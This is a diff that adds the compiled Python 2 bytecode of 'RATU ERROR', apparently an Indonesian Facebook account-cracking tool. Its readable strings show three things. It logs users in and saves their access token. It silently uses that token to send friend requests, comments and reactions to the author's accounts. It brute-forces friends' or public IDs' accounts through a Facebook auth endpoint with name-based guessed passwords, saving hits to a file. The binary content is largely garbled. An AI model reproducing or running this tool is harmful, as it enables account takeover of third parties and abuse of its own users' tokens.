@@ -1,0 +1,346 @@
+�
+Ɛ�_c@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlm
+Z
+yddlZWnek
+r�ejd�nXyddlZWnek
+rejd�nXyddlZWn+ek
+r?ejd�ejd�nXddlmZddlmZee�ejd	�ej�Zeje�ejejj�d
+d�dd
+fge_d�Zd�Z d�Z!d�Z"dZ#d�Z$dZ%gZ&gZ'ga(ga)gZ*gZ+gZ,gZ-gZ.gZ/gZ0gZ1gZ2dZ3dZ4d�Z5d�Z6d�Z7d�Z8d�Z9d�Z:d�Z;d�Z<d�Z=d �Z>e?d!kr�e;�e5�ndS("i����N(t
+ThreadPoolspip2 install mechanizespip2 install bs4spip2 install requestsspython2 ratuerror(tConnectionError(tBrowsertutf8tmax_timeis
+User-AgentsROpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16cCsdGHtjj�dS(Ns[!] Exit(tostsystexit(((s/sdcard/ratuerror2tkeluarscCsSd}d}x:|D]2}|d|tjdt|�d�|7}qWt|�S(NtmhkbpcPtt!ii(trandomtrandinttlentcetak(txtwtdti((s/sdcard/ratuerror2tacak$s
+
+0cCs~d}xA|D]9}|j|�}|jd|dtd|��}q
+W|d7}|jdd�}tjj|d�dS(NR	s!%ss%s;iR
+s!0s
+(tindextreplacetstrRtstdouttwrite(RRRtj((s/sdcard/ratuerror2R,s
+(
+cCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns
+g���Q��?(RRRtflushttimetsleep(tzte((s/sdcard/ratuerror2tjalan6s
+s�
+[1;91m▉▔◣▉▔◤▉┆▉ ▉┆┆▉▉┆┆▉┆▉▉▔▉
+[1;91m▉┆▉▉▂┆◥▉◤ ▉┆┆▉▉┆┆▉▂◤▉▂◤
+[1;39m▉┆▉▉▔┆◢▉◣ ▉◢◣▉▉┆┆▉▔▉▉┆▉
+[1;39m▉▂◤▉▂◣▉┆▉ ▉◤◥▉▉▂◣▉┆▉▉┆▉
+cCsFdddg}x0|D](}d|Gtjj�tjd�qWdS(Ns.   s..  s... s7
+[1;39m[[1;39m●[1;39m][1;39m Sedang masuk[1;39m i(RRRRR(ttitikto((s/sdcard/ratuerror2ttikFs
+
+
+isNot VulntVulncCs;tjd�tGHdGHdGHdGHdGHdGHdGHt�dS(Ntclears�[1;39m╔══════════════════════════════════════════╗sU[1;39m║[[1;31;1m01[1;39m][37;1mLogin Menggunakan Email / ID Facebook [1;39m║sU[1;39m║[[1;31;1m02[1;39m][37;1mLogin Menggunakan Token Facebook      [1;39m║sU[1;39m║[[1;31;1m03[1;39m][37;1mAmbil Token                           [1;39m║sU[1;39m║[[1;31;1m00[1;39m][37;1mKeluar                                [1;39m║s�[1;39m╚══════════════════════════════════════════╝(Rtsystemtlogotpilih_masuk(((s/sdcard/ratuerror2tmasuk^s
+cCs�td�}|dkr'dGHt�n�|dks?|dkrIt�nr|dksa|dkrkt�nP|dks�|d	kr�t�n.|d
+ks�|dkr�t�ndGHt�dS(Ns [1;39mRATU ERROR [39m:[30;1m R
+s'[37;1m[[32;1m![37;1m] Isi Yg Benar !t1t01t2t02t3t03t0t00(t	raw_inputR(tloginttokenztAmbil_TokenR(tmsuk((s/sdcard/ratuerror2R(is
+
+
+
+
+cCs�tjd�ytdd�}t�Wnvttfk
+r�tjd�tGHdGHtd�}td�}t�yt	jd�Wn t
+jk
+r�dGHt�nXt
+t	j_t	jd	d
+�|t	jd<|t	jd<t	j�t	j�}d
+|krAyd|d|d}idd6dd6|d6dd6dd6dd6dd6dd6|d6dd6d d!6}tjd"�}|j|�|j�}|ji|d#6�d$}tj|d%|�}tj|j�}	tdd&�}
+|
+j|	d'�|
+j�d(GHtjd)�t�WqAtj j!k
+r=dGHt�qAXnd*|krvd+GHtjd,�t"j#d-�t�q�d.GHtjd,�t"j#d-�t$�nXdS(/NR%s	login.txttrsP[1;39m[[1;96m🤡[1;39m] LOGIN AKUN FACEBOOK ANDA [1;39m[[1;96m🤡[1;39m]s&[[1;39m+[1;39m] ID / Email =[1;39m s+[1;39m[[1;39m?[1;39m] Password =[1;39m shttps://m.facebook.coms
+[!] Tidak ada koneksitnritemailtpassssave-devicesGapi_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t 882a8490361da98702bf97a021ddc14dtapi_keytpasswordtcredentials_typetJSONtformatR*tgenerate_machine_idtgenerate_session_cookiesten_UStlocales
+auth.logintmethodR0treturn_ssl_resourcess1.0tvtmd5tsigs'https://api.facebook.com/restserver.phptparamsRtaccess_tokens1
+[1;39m[[1;39m✓[1;39m][1;39m Login Berhasils/xdg-open https://m.facebook.com/user.keramat.90t
+checkpoints@
+[1;39m[[1;39m![1;39m][1;39m Sepertinya Akun Anda Checkpointsrm -rf login.txtis7
+[1;39m[[1;39m![1;39m][1;39m Password / Email Salah(%RR&topentmenutKeyErrortIOErrorR'R2R#tbrt	mechanizetURLErrorRtTruet_factorytis_htmltselect_formtformtsubmittgeturlthashlibtnewtupdatet	hexdigesttrequeststgettjsontloadsttextRtcloset	bot_koment
+exceptionsRRRR)(ttokettidtpwdturlRItdataRtaR7Rtunikers((s/sdcard/ratuerror2R3{sf
+
+
+
+
+S
+
+
+
+
+
+
+
+cCs�tjd�tGHtd�}yetjd|�}tj|j�}|d}t	dd�}|j
+|�|j�dGHt�Wn*t
+k
+r�dGHtjd	�t�nXdS(
+NR%s/[1;39m[[1;39m?[1;39m] [1;39mToken : [30;1ms+https://graph.facebook.com/me?access_token=tnames	login.txtRs0[1;39m[[1;39m✓[1;39m][1;39m Login Berhasils-[1;39m[[1;39m![1;39m] [1;39mToken Salah !i(RR&R'R2R_R`RaRbRcRMRRdReRORRR)(RgtotwRltnamatzedd((s/sdcard/ratuerror2R4�s 
+
+
+
+
+
+cCsytdd�j�}Wn#tk
+r>dGHtjd�nXd}d}d}d}d	}d}d
+}tjd|d|�tjd
+|d|d|�tjd
+|d|d|�tjd
+|d|d|�tjd
+|d|d|�t�dS(Ns	login.txtR7s[1;39m[!] Token invalidsrm -rf login.txtt
+1741317224sPengguna Script RATU ERRORtANGRYt10208220852355940t10208274615099975tLOVEs7https://graph.facebook.com/me/friends?method=post&uids=s&access_token=shttps://graph.facebook.com/s/comments/?message=s/reactions?type=(RMtreadRPRR&R_tpostRN(RgtunatkomtreacRxtpost2tkom2treac2((s/sdcard/ratuerror2Re�s$
+!!!!cCsUtjd�tGHtd�tjd�td�tjd�td�t�dS(NR%s[1;39mInstall...scd ... && npm installs[1;96mMulai...scd ... && npm starts
+[ Kembali ](RR&R'R R2R)(((s/sdcard/ratuerror2R5�s
+
+
+
+
+
+cCsVtjd�ytdd�j�}Wn2tk
+rZtjd�tjd�t�nXy=tjd|�}tj	|j
+�}|d}|d}Wnftk
+r�tjd�dGHtjd�tj
+d	�t�n#tjjk
+rd
+GHt�nXtjd�tGHdGHd|GHd
+|GHd|dGHdGHdGHdGHdGHt�dS(NR%s	login.txtR7srm -rf login.txts+https://graph.facebook.com/me?access_token=RnRhs[1;96m[!] [1;39mToken invalidis[!] Tidak ada koneksis1[37;1m==========================================sA[1;39m[[1;39m✓[1;39m][1;39m Nama Akun[1;39m     =>[1;39m sA[1;39m[[1;39m•[1;39m][1;39m UID[1;39m           =>[1;39m s?[1;39m[[1;39m+[1;39m][1;39m Tanggal Lahir[1;39m =>[1;39m tbirthdaysX[1;92m╔═════════════════════════╗sJ[1;92m║[[1;92;1m01[1;92m][1;31;1m->[37;1mCrack ID Indonesia [1:║sM[1;92m║[[1;92;1m00[1;92m][1;31;1m->[37;1mKeluar             [1;92m║sX[1;92m╚═════════════════════════╝(RR&RMRwRPR)R_R`RaRbRcRORRRfRRR'tpilih(RgRoRlRpRh((s/sdcard/ratuerror2RN�s@
+
+
+
+
+
+
+
+
+
+
+		
+cCs�td�}|dkr'dGHt�nt|dks?|dkrIt�nR|dksa|dkr�tjd�td	�tjd
+�t�ndGHt�dS(Ns[1;39mratu error> [30;1m R
+s.[1;39m[[1;39m![1;39m][1;39m Isi Yg Benar !R*R+R0R1R%sMenghapus tokensrm -rf login.txt(R2R�tindoRR&R R(Rm((s/sdcard/ratuerror2R�s
+
+
+
+
+
+cCs�tjd�ytdd�j�aWn7tk
+r_dGHtjd�tjd�t�nXtjd�t	GHdGHdGHd	GHd
+GHdGHdGHt
+�dS(
+NR%s	login.txtR7s[1;96m[!] [1;39mToken invalidsrm -rf login.txtish[37;96m╔══════════════════════════════╗sK[37;96m║[1;39m[01][1;31;1m->[37;1mCrack Dari Daftar Teman [37;96m║sK[37;96m║[1;39m[02][1;31;1m->[37;1mCrack Dari ID Publik    [37;96m║sK[37;96m║[1;39m[03][1;31;1m->[37;1mCrack Dari File         [37;96m║sK[37;96m║[1;39m[00][1;31;1m->[37;1mKembali                 [37;96m║sh[37;96m╚══════════════════════════════╝(RR&RMRwRgRPRRRR't
+pilih_indo(((s/sdcard/ratuerror2R�s"
+
+
+
+
+cCsVtd�}|dkr'dGHt�n�|dkp<|dkr�tjd�tGHdGHtjdt�}tj	|j
+�}x#|d	D]}tj|d
+�q�Wn|dkp�|dkr�tjd�tGHdGHtd
+�}y>tjd|dt�}tj	|j
+�}d|dGHWnIt
+k
+rFdGHtd�t�n#tjjk
+rhdGHt�nXtjd|dt�}tj	|j
+�}x#|d	D]}tj|d
+�q�Wn�|dkp�|dkr}tjd�tGHyHdGHtd�}x0t|d�j�D]}	tj|	j��qWWnFt
+k
+rSdGHtd�n'tk
+rydGHtd�t�nXn.|dkp�|dkr�t�ndGHt�dttt��GHd GHd!d"d#g}
+x0|
+D](}d$|Gtjj�tjd%�q�Wd&GHd'�}td(�}
+|
+j|t�d)GHd*GHtd+�tjd,�dS(-Ns[1;39mratu error> [30;1m R
+s.[1;39m[[1;39m![1;39m][1;39m Isi Yg Benar !R*R+R%s3[1;31;1m==========================================s3https://graph.facebook.com/me/friends?access_token=RkRhR,R-s4[1;39m{[1;39m✔[1;39m} ID publik/teman : [1;93mshttps://graph.facebook.com/s?access_token=s"[1;39m{[1;39m✴[1;39m} Nama : Rns4[1;39m[[1;39m![1;39m] ID publik/teman tidak ada !s
+[ Kembali ]s[!] Tidak ada koneksi !s/friends?access_token=R.R/s%[1;39m{[1;39m?[1;39m} Nama File : R7s[1;39m[!] File tidak ada ! s!
+[1;39m[ [1;39mKembali [1;39m]s[1;39m[!] File tidak ada !R0R1s&[1;39m{[1;39m➹[1;39m} Total ID : s&[1;39m{[1;39m➹[1;39m} Stop CTRL+Zs.   s..  s... s+
+[1;39m{[1;39m➹[1;39m} Crack Berjalan is4
+[1;31;1m==========================================cSs�|}ytjd�Wntk
+r*nXy�tjd|dt�}tj|j�}|dd}t	j
+d|d|d�}tj|�}d	|krtjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�
+d|dkr�dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n
+|dd}
+t	j
+d|d|
+d�}tj|�}d	|krntjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|
+dGHd|dGHtj
+||
+�n@d|dkr�dGHd|d
+GHd|GHd|
+dGHd|dGHtdd�}	|	jd|d|
+d�|	j�tj
+||
+�n�|dd}t	j
+d|d|d�}tj|�}d	|kr�tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�
+d|dkrNdGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n`
+|dd}t	j
+d|d|d�}tj|�}d	|krtjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�	d|dkr�dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n	|dd}
+t	j
+d|d|
+d�}tj|�}d	|kratjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|
+dGHd|dGHtj
+||
+�nMd|dkr�dGHd|d
+GHd|GHd|
+dGHd|dGHtdd�}	|	jd|d|
+d�|	j�tj
+||
+�n�|dd}t	j
+d|d|d�}tj|�}d	|kr�tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�d|dkrAdGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�nmd}t	j
+d|d|d�}tj|�}d	|kr�tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�d|dkr�	dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n$d}t	j
+d|d|d�}tj|�}d	|krD
+tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�njd|dkr�
+dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n�d }t	j
+d|d|d�}tj|�}d	|kr�tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n!d|dkrdGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�n�d!}t	j
+d|d|d�}tj|�}d	|kr�tjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�d|dkre
+dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�nId"}t	j
+d|d|d�}tj|�}d	|krtjd|d
+|d	�}tj|j�}dGHd|d
+GHd|GHd|dGHd|dGHtj
+||�n�d|dkr�dGHd|d
+GHd|GHd|dGHd|dGHtdd�}	|	jd|d|d�|	j�tj
+||�nWnnXdS(#Ntoutshttps://graph.facebook.com/s/?access_token=t
+first_namet123s�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RKs?access_token=s[1;92mBerhasils#[1;39mName [1;39m    : [1;39mRns#[1;39mID [1;39m      : [1;39ms#[1;39mPassword [1;39m: [1;39ms
+s2[1;39m- [1;39mTanggal Lahir [1;39m: [1;39mRswww.facebook.comt	error_msgs[1;39mCheckpointsout/super_cp.txtRlsID:s Pw:t1234t12345t	last_names[1;39mBerhasiltSayangt	Sayang123t
+Sayang1234tBangsattDoraemon(RtmkdirtOSErrorR_R`RgRaRbRcturllibturlopentloadtokstappendRMRRdtcekpoint(targtuserRltctpass1RkRRRtcektpass2tpass3tpass4tpass5tpass6tpass7tpass8tpass9tpass10tpass11((s/sdcard/ratuerror2tmainms�
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+
+	
+
+
+	
+
+
+is
+[1;91    SELESAIs[1;39mTERIMAKASIHs2[1;95m•[1;95m[[1;93mKembali[1;95m][1;95m•spython2 ratuerror( R2R�RR&R'R_R`RgRaRbRcRhR�ROR�RfRRRMt	readlineststripRPRNRRRRRRRRtmap(tteakR7RtstidttjoktopRtidlisttlineR!R"R�tp((s/sdcard/ratuerror2R�.s�
+
+
+
+
+
+
+
+
+
+
+
+
+
+	�
+t__main__(@RRRtdatetimeRR[tret	threadingRatgetpassR�t	cookielibtmultiprocessing.poolRRRtImportErrorR&tbs4R_trequests.exceptionsRRtreloadtsetdefaultencodingRQtset_handle_robotstFalsetset_handle_refresht_httptHTTPRefreshProcessort
+addheadersRRRR R'R#tbacktthreadstberhasilR�R�toketcpeRhtusernametidtemantidfromtemantgagaltreaksitkomentvulnottvulnR)R(R3R4ReR5RNR�R�R�t__name__(((s/sdcard/ratuerror2t<module>st�
+
+
+
+
+
+
+			
+					7				#			�^
